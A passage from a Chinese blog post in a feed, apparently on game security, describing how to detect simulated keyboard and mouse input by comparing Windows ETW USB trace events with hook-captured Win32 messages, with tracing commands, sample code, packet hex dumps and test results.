2</span><br><span class="line">logman start -n usbtrace</span><br></pre></td></tr></table></figure><p>停止抓取</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">logman stop -n usbtrace</span><br><span class="line">logman delete -n usbtrace</span><br><span class="line">move /Y %SystemRoot%\Tracing\usbtrace_000001.etl %SystemRoot%\Tracing\usbtrace.etl</span><br></pre></td></tr></table></figure><p>最后会生成一个 usbtrace.etl 文件。</p><img src="/2024/07/08/etw/2.png" class=""><p>时间轴也可以见到一直是出现 26 和 27 号的事件，所以主要分析的就是这两个事件。</p><p>这里我又参考了另一<a href="https://github.com/MSDN-WhiteKnight/HidLogger/blob/master/HidLogger.cs">项目</a>，是 C# 写的，但是略微可以看出一二。</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> UsbData <span class="title">GetData</span>(<span class="params">TraceEvent eventData</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">ulong</span> hndl;</span><br><span class="line">    <span class="built_in">object</span> field;</span><br><span class="line">    <span class="built_in">uint</span> vid=<span class="number">0</span>,pid=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">byte</span> usbver = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//try to determine device handle and IDs</span></span><br><span class="line">    field = GetItem(eventData, <span class="string">&quot;fid_USBPORT_Device&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (field != <span class="literal">null</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        Dictionary&lt;<span class="built_in">string</span>, <span class="built_in">string</span>&gt; deviceInfo = _expose(field);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">ulong</span>.TryParse(deviceInfo[<span class="string">&quot;DeviceHandle&quot;</span>], <span class="keyword">out</span> hndl) &amp;&amp; hndl &lt;= <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        vid = UInt32.Parse(deviceInfo[<span class="string">&quot;idVendor&quot;</span>]);</span><br><span class="line">        pid = UInt32.Parse(deviceInfo[<span class="string">&quot;idProduct&quot;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        hndl = (<span class="built_in">ulong</span>)GetItem(eventData, <span class="string">&quot;fid_PipeHandle&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (hndl &lt;= <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//try to get event parameters</span></span><br><span class="line">    field = GetItem(eventData, <span class="string">&quot;fid_USBPORT_URB_BULK_OR_INTERRUPT_TRANSFER&quot;</span>); <span class="comment">//2.0</span></span><br><span class="line">    usbver = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> (field == <span class="literal">null</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        field = GetItem(eventData, <span class="string">&quot;fid_UCX_URB_BULK_OR_INTERRUPT_TRANSFER&quot;</span>); <span class="comment">//3.0</span></span><br><span class="line">        usbver = <span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Dictionary&lt;<span class="built_in">string</span>, <span class="built_in">string</span>&gt; urb = _expose(field);<span class="comment">//transform parameter string to dictionary</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//determine transferred data length</span></span><br><span class="line">    <span class="built_in">int</span> xferDataSize = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">int</span>.TryParse(urb[<span class="string">&quot;fid_URB_TransferBufferLength&quot;</span>], <span class="keyword">out</span> xferDataSize))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> ((xferDataSize &gt; <span class="number">8</span>) &amp;&amp; (usbver == <span class="number">2</span>)) xferDataSize = <span class="number">8</span>; <span class="comment">//USB 2.0 sometimes gives wrong size </span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (xferDataSize &gt; <span class="number">8</span>) <span class="keyword">return</span> <span class="literal">null</span>; <span class="comment">//data is too large for mouse / keyboard</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">byte</span>[] data2=eventData.EventData();</span><br><span class="line">    <span class="built_in">byte</span>[] xferData = <span class="keyword">new</span> <span class="built_in">byte</span>[xferDataSize];</span><br><span class="line">    Array.Copy(data2, eventData.EventDataLength - xferDataSize, xferData, <span class="number">0</span>, xferDataSize);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">bool</span> HasNonZero = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; xferDataSize; i++)</span><br><span class="line">        <span class="keyword">if</span> (xferData[i] != <span class="number">0</span>) &#123; HasNonZero = <span class="literal">true</span>; <span class="keyword">break</span>; &#125;</span><br><span class="line">    <span class="keyword">if</span> (HasNonZero == <span class="literal">false</span>) <span class="keyword">return</span> <span class="literal">null</span>; <span class="comment">//data is empty</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Construct UsbData object*/</span></span><br><span class="line">    UsbData data = <span class="keyword">new</span> UsbData(eventData.TimeStamp, hndl, xferData);</span><br><span class="line">    data.usbver = usbver;</span><br><span class="line">    data.datalen = (<span class="built_in">uint</span>)xferDataSize;</span><br><span class="line">    data.vid = vid;</span><br><span class="line">    data.pid = pid;</span><br><span class="line">    <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>刚好和我主要参考的框架的事件处理中有相似之处。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">VOID</span></span><br><span class="line"><span class="function">    <span class="title">EtwCallback</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    __in PEVENT_RECORD Event</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DWORD size;</span><br><span class="line">    PTRACE_EVENT_INFO trace;</span><br><span class="line">    PWCHAR provider;</span><br><span class="line">    EVENT_PROPERTY_INFO property;</span><br><span class="line">    EVENT_PROPERTY_INFO iProperty;</span><br><span class="line"></span><br><span class="line">    trace = <span class="built_in">GetEventData</span>(Event, &amp;size);</span><br><span class="line"></span><br><span class="line">    provider = (PCHAR)trace + trace-&gt;ProviderNameOffset;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (UINT countIndex = <span class="number">0</span>;</span><br><span class="line">         countIndex &lt; trace-&gt;TopLevelPropertyCount;</span><br><span class="line">         countIndex = countIndex + <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        EVENT_PROPERTY_INFO  property = trace-&gt;EventPropertyInfoArray[countIndex];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">wcscmp</span>(<span class="string">L&quot;fid_UCX_URB_BULK_OR_INTERRUPT_TRANSFER&quot;</span>, (PCHAR)trace + property.NameOffset))</span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (INT propertyIndex = property.structType.StructStartIndex;</span><br><span class="line">                 propertyIndex &lt; property.structType.StructStartIndex + property.structType.NumOfStructMembers;</span><br><span class="line">                 propertyIndex = propertyIndex + <span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                iProperty = trace-&gt;EventPropertyInfoArray[propertyIndex];</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (!<span class="built_in">wcscmp</span>(<span class="string">L&quot;fid_URB_TransferBufferLength&quot;</span>, (PCHAR)trace + iProperty.NameOffset))</span><br><span class="line">                &#123;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">//</span></span><br><span class="line">                    <span class="comment">//Get value of fid_URB_TransferBufferLength</span></span><br><span class="line">                    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">                    LPCWSTR string = <span class="built_in">GetPropertyData</span>(</span><br><span class="line">                        trace,</span><br><span class="line">                        Event,</span><br><span class="line">                        iProperty,</span><br><span class="line">                        <span class="number">20</span>); <span class="comment">// index for fid_URB_TransferBufferLength</span></span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (string == <span class="literal">NULL</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">//</span></span><br><span class="line">                    <span class="comment">// Filter out for only keyboard packets by size</span></span><br><span class="line">                    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (!<span class="built_in">wcscmp</span>(string, <span class="string">L&quot;0xC&quot;</span>))</span><br><span class="line">                    &#123;</span><br><span class="line">                        etwCount = etwCount + <span class="number">1</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="built_in">free</span>(string);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(trace);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>前者，会判断 <code>fid_URB_TransferBufferLength</code> 这个属性的属性值，进行一些判断，根据注释也可以看明白，在当时的年代，可能鼠标事件的这个长度是 4 或者 5，键盘事件的长度是 8，超出则该事件不是键盘或者鼠标的点击或移动事件。</p><p>后者同样是取出值判断是否为 0xC，来检查是不是键盘事件，若是则让 etwCount+1。这里需要说明的是，这个项目的原理和我的构思是差不多的，它hook了windows消息，每次获得 F1 键的消息时会判断这次点击是不是 F1，然后根据 etwCount 和win32Count 的值做比对，看看是不是四倍的关系，若是则没有使用键盘模拟。</p><p>实际测试的时候，键盘按下时消息长度的对应属性值应该是 0x25，鼠标移动和点击事件的长度对应的属性值为 0x9。今非昔比了，改了也可以理解。</p><p>而按下按键的时候有概率触发 8 个事件，也有可能触发 6 个事件，也有可能是4个事件，这个好像还真是看脸了。但是通过一个驱动模拟按键则是不会触发任何 etw 的事件。鼠标点击来说，每次触发 4 个事件是没有问题的。</p><p>检测键盘的思路就是，每次收到键盘的etw事件，让etw计数器 +1，同时 hook windows 消息，每次接收到非F1的按键也让按键计数器 +1，最后只要 <code>etwCount &lt; 6*Win32Count</code> 则可以直接判定为使用了键盘模拟。</p><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>这里让etw每次记录时输出，keyboard每次收到消息时输出当前按键次数。</p><p>首先是正常情况下的按键。</p><img src="/2024/07/08/etw/3.png" class=""><p>因为etw接受消息有一定的延迟，所以中间输出结果可能有点不对，但是最终结果是在偏差范围内的，即 <code>4*Win32Count&lt;=etwCount&lt;=8*Win32Count</code>。</p><p>一般上限不会超，所以检测下限即可。</p><img src="/2024/07/08/etw/4.png" class=""><p>自然是不会超的。</p><p>如果是按键模拟，这里我找了一个开源项目的模拟按键来测试。</p><p>它可以一直触发消息而不触发 etw。</p><img src="/2024/07/08/etw/5.png" class=""><p>结果自然而然的是会触发到模拟器检测的。</p><p>虽然不知道它按键数据怎么分析，而且会有一定的随机性，但是对于检测模拟类外挂来说足矣。只要取一段区间，它的模拟按键次数大于实际键盘按键次数，那么必能检测到的，通过一定的数学推导也不难得到。</p><h3 id="深入了解"><a href="#深入了解" class="headerlink" title="深入了解"></a>深入了解</h3><p>因为这个协议没有被文档话，而根据 8 年前的 poc 去解析协议得到的是全 0 数据，那么只能是想办法自己找准具体的协议了。</p><p>首先按 <code>aba</code> 得到所有跟键盘事件相关的事件包。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">98 af cf b8 77 4a 00 00 d8 df c0 b9 77 4a 00 00 b0 5a 60 4d 88 b5 ff ff 60 69 57 4d 88 b5 ff ff e0 65 9c 61 88 b5 ff ff 80 00 09 00 00 00 00 40 d8 df c0 b9 77 4a 00 00 00 00 00 00 00 00 00 00 b0 5a 60 4d 88 b5 ff ff 03 00 00 00 25 00 00 00 90 14 4f 4d 88 b5 ff ff 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 04 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">98 af cf b8 77 4a 00 00 d8 df c0 b9 77 4a 00 00 b0 5a 60 4d 88 b5 ff ff 60 69 57 4d 88 b5 ff ff 50 43 b5 56 88 b5 ff ff 80 00 09 00 00 00 00 40 d8 df c0 b9 77 4a 00 00 00 00 00 00 00 00 00 00 b0 5a 60 4d 88 b5 ff ff 03 00 00 00 25 00 00 00 90 14 4f 4d 88 b5 ff ff 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 04 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">98 af cf b8 77 4a 00 00 d8 df c0 b9 77 4a 00 00 b0 5a 60 4d 88 b5 ff ff 60 69 57 4d 88 b5 ff ff f0 63 d8 61 88 b5 ff ff 80 00 09 00 00 00 00 40 d8 df c0 b9 77 4a 00 00 00 00 00 00 00 00 00 00 b0 5a 60 4d 88 b5 ff ff 03 00 00 00 25 00 00 00 90 14 4f 4d 88 b5 ff ff 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 04 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br></pre></td></tr></table></figure><p>这里都取第一个抓到的数据，可以发现第一个数据包只有 +20 开始往后 4 个字节不一样，而且相同按键之间似乎没有太多联系。一次键盘事件可以看作是键盘按下和弹起两个子事件，而这两个子事件分别会触发 2 或者 4 个etw事件。</p><p>通过研究事件的关系可以看出，按下的时候，若开始事件为 26，则接下来到来的事件还是 26，随后是 27，26。如果开始事件是 27，则之后单走一个 26。弹起大部分情况都是 <code>(27,26)*2</code>，长度为 4 的比较难复现出来，但是可以通过排除连续的 2 个 26 事件达到尽可能地使得随机性减少。</p><blockquote><p>这里解释一下我描述的事件，我上面两段话所说的“到来的事件”均指的是携带了键盘数据的 etw 事件。根据时间轴来看，事件到来的顺序是 26 与 27 交替到来，那么从时间轴来看，“连续的两个 26 事件”指的是两个携带了键盘数据的 26 事件中间夹杂了一个没有携带键盘数据的 27 事件。</p><p>而携带键盘数据正如最开始解释的，<code>fid_URB_TransferBufferLength</code> 属性值为 0x25 的事件。</p></blockquote><p>从抓包数据可以分析。</p><img src="/2024/07/08/etw/6.png" class=""><ul><li>27 事件的数据长度为 172。</li><li>26 事件的数据长度为 168。</li></ul><p>从上面分析的抓包信息得知，抓到的数据包都是 26 事件，因此可以尝试抓 aba 键盘按下所产生的 27 事件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">98 af cf b8 77 4a 00 00 d8 df c0 b9 77 4a 00 00 b0 5a 60 4d 88 b5 ff ff 60 69 57 4d 88 b5 ff ff 50 24 f0 5d 88 b5 ff ff 80 00 09 00 00 00 00 00 d8 df c0 b9 77 4a 00 00 00 00 00 00 00 00 00 00 b0 5a 60 4d 88 b5 ff ff 03 00 00 00 25 00 00 00 90 14 4f 4d 88 b5 ff ff 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 04 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">98 af cf b8 77 4a 00 00 d8 df c0 b9 77 4a 00 00 b0 5a 60 4d 88 b5 ff ff 60 89 57 4d 88 b5 ff ff e0 4c f0 5d 88 b5 ff ff 80 00 09 00 00 00 00 00 d8 df c0 b9 77 4a 00 00 00 00 00 00 00 00 00 00 b0 5a 60 4d 88 b5 ff ff 03 00 00 00 25 00 00 00 d0 14 4f 4d 88 b5 ff ff 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 04 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">98 af cf b8 77 4a 00 00 d8 df c0 b9 77 4a 00 00 b0 5a 60 4d 88 b5 ff ff 60 89 57 4d 88 b5 ff ff e0 4c f0 5d 88 b5 ff ff 80 00 09 00 00 00 00 00 d8 df c0 b9 77 4a 00 00 00 00 00 00 00 00 00 00 b0 5a 60 4d 88 b5 ff ff 03 00 00 00 25 00 00 00 d0 14 4f 4d 88 b5 ff ff 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 04 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br></pre></td></tr></table></figure><p>发现只有 +80 字节有差异，要么是 0xd0 要么是 0x90，没有别的情况，其它的数据基本一模一样了。</p><p>因此从协议去分析，直接卒了。</p><h3 id="鼠标模拟检测"><a href="#鼠标模拟检测" class="headerlink" title="鼠标模拟检测"></a>鼠标模拟检测</h3><p>前面分析过，长度为 9 的数据是鼠标信息，经过测试，每次移动（大约 0.5 - 1.5 个像素），点击或者其它的鼠标操作都会触发 etw，当然模拟的同样不会触发，那么消息钩子和etw事件数是否会有一定的联系呢？答案是肯定的，这里稍微改一下，然后让左键输出 etwCount 和 win32Count 的值以及比值。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">LRESULT</span><br><span class="line">    <span class="title function_">Win32Callback</span><span class="params">(</span></span><br><span class="line"><span class="params">    __in INT    Code,</span></span><br><span class="line"><span class="params">    __in WPARAM WParam,</span></span><br><span class="line"><span class="params">    __in LPARAM LParam</span></span><br><span class="line"><span class="params">)</span></span><br><span class="line">&#123;</span><br><span class="line">    KBDLLHOOKSTRUCT* key = (KBDLLHOOKSTRUCT*)LParam;</span><br><span class="line">    <span class="keyword">if</span> (WParam == WM_LBUTTONUP) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d %d\n&quot;</span>, win32Count, etwCount);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;rate: %f\n&quot;</span>, <span class="number">1.0</span> * etwCount / win32Count);</span><br><span class="line">    &#125;</span><br><span class="line">    win32Count++;</span><br><span class="line">    <span class="keyword">return</span> CallNextHookEx(MouseHook,</span><br><span class="line">                          Code,</span><br><span class="line">                          WParam,</span><br><span class="line">                          LParam);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2024/07/08/etw/7.png" class=""><p>基本是可以得到结论 <code>etwCount / win32Count</code> 大概是在 2 左右的比值，可能有略微的浮动，</p><p>可以设置一个比较低的阈值，比如 1.5，如果发现低于这个值则直接判定为使用了鼠标模拟，这里略微改一下左键的事件可以达到。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">LRESULT</span><br><span class="line">    <span class="title function_">Win32Callback</span><span class="params">(</span></span><br><span class="line"><span class="params">    __in INT    Code,</span></span><br><span class="line"><span class="params">    __in WPARAM WParam,</span></span><br><span class="line"><span class="params">    __in LPARAM LParam</span></span><br><span class="line"><span class="params">)</span></span><br><span class="line">&#123;</span><br><span class="line">    KBDLLHOOKSTRUCT* key = (KBDLLHOOKSTRUCT*)LParam;</span><br><span class="line">    <span class="keyword">if</span> (WParam == WM_LBUTTONUP) &#123;</span><br><span class="line">        <span class="type">double</span> rate = <span class="number">1.0</span> * etwCount / win32Count;</span><br><span class="line">        system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d %d\n&quot;</span>, win32Count, etwCount);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;rate: %f\n&quot;</span>, <span class="number">1.0</span> * etwCount / win32Count);</span><br><span class="line">        <span class="keyword">if</span> (rate &lt; <span class="number">1.5</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Mouse sim detected\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Mouse sim not found\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        etwCount = <span class="number">0</span>;</span><br><span class="line">        win32Count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    win32Count++;</span><br><span class="line">    <span class="keyword">return</span> CallNextHookEx(MouseHook,</span><br><span class="line">                          Code,</span><br><span class="line">                          WParam,</span><br><span class="line">                          LParam);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正常情况刚才已经试验过了，肯定是不会触发的，这里使用一款鼠标模拟器[3]去点击看看能否检测到，因为存在延时的缘故，建议移动之后等待 2s 左右再按下左键。</p><img src="/2024/07/08/etw/8.png" class=""><p>在经过一系列移动之后点击左键显然也可以成功检测到模拟器。</p><h3 id="方案实现"><a href="#方案实现" class="headerlink" title="方案实现"></a>方案实现</h3><p>鼠标模拟检测方案需要上最终实现的话还有很多问题需要解决，大概罗列了一些。</p><ul><li>etw 事件是异步的，etw事件上报延时需要考虑。</li><li>不同操作系统的事件上报协议可能有所不同，需要对大部分主流的 windows 版本都做适配才能放入最终方案。</li><li>因为只检测了指定 usb3.0 的provider 给定的事件，如果鼠标-键盘设备不是走 usb 协议（如蓝牙鼠标或键盘）则可能会误报。但是个人测试下来，一般笔记本内置和常见的有线外接键盘鼠标都可以被检测到。</li></ul><p>对于以上的问题，也提出几个可能解决的方案。对于第一个异步的问题，既然没有办法让 etw 变为同步上报，那么可以考虑适当放宽检测条件平衡这个误差。例如，取 60 秒时间内产生的鼠标-键盘消息和etw事件，计算比例看是否在合理的范围内。或者取 10w 次的etw事件为阈值，判断这期间内的鼠标键盘消息是否高于 5w（5w为鼠标，键盘则需要放低到 2.5w 左右），若高于则直接判定为使用了模拟器。</p><p>对于第二个问题，不同版本的操作系统协议确实也是一个大问题，因为微软没有官方的文档指示如何解析上报事件的协议，因此对于不同版本的操作系统只能是尽可能去测试完善得到最终方案。</p><p>对于第三个问题，游戏方如果强制玩家使用 usb3.0 协议的鼠标，则会显得不够亲民，但是是最简单暴力的办法。或者去研究蓝牙设备的etw事件，对此做适配。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li>[1]：<a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/devtest/event-tracing-for-windows--etw-">https://learn.microsoft.com/zh-cn/windows-hardware/drivers/devtest/event-tracing-for-windows--etw-</a></li><li>[2]：<a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/usbcon/how-to-capture-a-usb-event-trace3">https://learn.microsoft.com/zh-cn/windows-hardware/drivers/usbcon/how-to-capture-a-usb-event-trace3</a></li><li>[3]：<a href="https://github.com/taojy123/KeymouseGo">https://github.com/taojy123/KeymouseGo</a></li></ul>]]></content>
    
    
    <summary type="html">尝试做一做模拟类外挂检测</summary>
    
    
    
    <category term="计算机系统" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="Windows" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/Windows/"/>
    
    <category term="游戏安全" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/Windows/%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
</feed>
